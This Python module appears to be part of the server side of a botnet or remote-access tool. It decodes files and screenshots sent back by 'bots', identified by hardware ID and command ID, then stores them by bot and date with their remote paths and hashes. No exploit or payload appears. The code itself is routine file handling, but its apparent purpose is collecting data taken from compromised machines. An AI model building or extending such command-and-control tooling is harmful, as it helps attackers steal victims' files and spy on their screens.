"""File extraction utilities for downloaded files and screenshots."""

import base64
import hashlib
import logging
import uuid
from datetime import datetime
from pathlib import Path

logger = logging.getLogger(__name__)

DATA_DIR = Path(__file__).parent.parent.parent.parent / "data"
DOWNLOADS_DIR = DATA_DIR / "downloads"
SCREENSHOTS_DIR = DATA_DIR / "screenshots"


def ensure_dirs():
    """Ensure data directories exist."""
    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
    SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)


def get_download_path(bot_hwid: str, filename: str, file_id: str) -> Path:
    """Generate storage path for a downloaded file."""
    ensure_dirs()
    today = datetime.now().strftime("%Y-%m-%d")
    # Sanitize filename
    safe_name = "".join(c for c in filename if c.isalnum() or c in "._-")[:64]
    if not safe_name:
        safe_name = "file"
    subdir = DOWNLOADS_DIR / bot_hwid[:8] / today
    subdir.mkdir(parents=True, exist_ok=True)
    return subdir / f"{file_id[:8]}_{safe_name}"


def get_screenshot_path(bot_hwid: str, screenshot_id: str, is_thumb: bool = False) -> Path:
    """Generate storage path for a screenshot."""
    ensure_dirs()
    today = datetime.now().strftime("%Y-%m-%d")
    suffix = "_thumb.png" if is_thumb else ".png"
    subdir = SCREENSHOTS_DIR / bot_hwid[:8] / today
    subdir.mkdir(parents=True, exist_ok=True)
    return subdir / f"{screenshot_id[:8]}{suffix}"


def compute_sha256(data: bytes) -> str:
    """Compute SHA256 hex digest of data."""
    return hashlib.sha256(data).hexdigest()


async def extract_download(
    response_data: dict,
    command_id: str,
    bot_hwid: str,
) -> dict | None:
    """
    Extract a downloaded file from response data.

    Expected response_data format:
    {
        "path": "/remote/path/to/file",
        "size": 12345,
        "data_b64": "base64-encoded-content"
    }

    Returns a dict with download metadata, or None if extraction fails.
    """
    data_b64 = response_data.get("data_b64")
    if not data_b64:
        return None

    try:
        file_bytes = base64.b64decode(data_b64)
    except Exception as e:
        logger.error(f"Failed to decode base64 for download: {e}")
        return None

    remote_path = response_data.get("path", "unknown")
    filename = Path(remote_path).name or "file"
    download_id = str(uuid.uuid4())
    local_path = get_download_path(bot_hwid, filename, download_id)

    try:
        local_path.write_bytes(file_bytes)
    except Exception as e:
        logger.error(f"Failed to write download file: {e}")
        return None

    sha256 = compute_sha256(file_bytes)

    return {
        "id": download_id,
        "bot_hwid": bot_hwid,
        "command_id": command_id,
        "remote_path": remote_path,
        "local_path": str(local_path.relative_to(DATA_DIR)),
        "filename": filename,
        "size": len(file_bytes),
        "sha256": sha256,
    }


async def extract_screenshot(
    response_data: dict,
    command_id: str,
    bot_hwid: str,
) -> dict | None:
    """
    Extract a screenshot from response data.

    Expected response_data format:
    {
        "format": "png",
        "size": 12345,
        "data_b64": "base64-encoded-png"
    }

    Returns a dict with screenshot metadata, or None if extraction fails.
    """
    data_b64 = response_data.get("data_b64")
    if not data_b64:
        return None

    try:
        img_bytes = base64.b64decode(data_b64)
    except Exception as e:
        logger.error(f"Failed to decode base64 for screenshot: {e}")
        return None

    screenshot_id = str(uuid.uuid4())
    fmt = response_data.get("format", "png")
    local_path = get_screenshot_path(bot_hwid, screenshot_id, is_thumb=False)
    thumb_path = get_screenshot_path(bot_hwid, screenshot_id, is_thumb=True)

    try:
        local_path.write_bytes(img_bytes)
    except Exception as e:
        logger.error(f"Failed to write screenshot file: {e}")
        return None

    # Try to generate thumbnail
    width, height = None, None
    thumb_relative = None
    try:
        from PIL import Image
        import io

        img = Image.open(io.BytesIO(img_bytes))
        width, height = img.size
        img.thumbnail((256, 256))
        img.save(thumb_path, format="PNG")
        thumb_relative = str(thumb_path.relative_to(DATA_DIR))
    except ImportError:
        logger.warning("PIL not available, skipping thumbnail generation")
    except Exception as e:
        logger.warning(f"Failed to generate thumbnail: {e}")

    return {
        "id": screenshot_id,
        "bot_hwid": bot_hwid,
        "command_id": command_id,
        "local_path": str(local_path.relative_to(DATA_DIR)),
        "thumbnail_path": thumb_relative,
        "format": fmt,
        "size": len(img_bytes),
        "width": width,
        "height": height,
    }
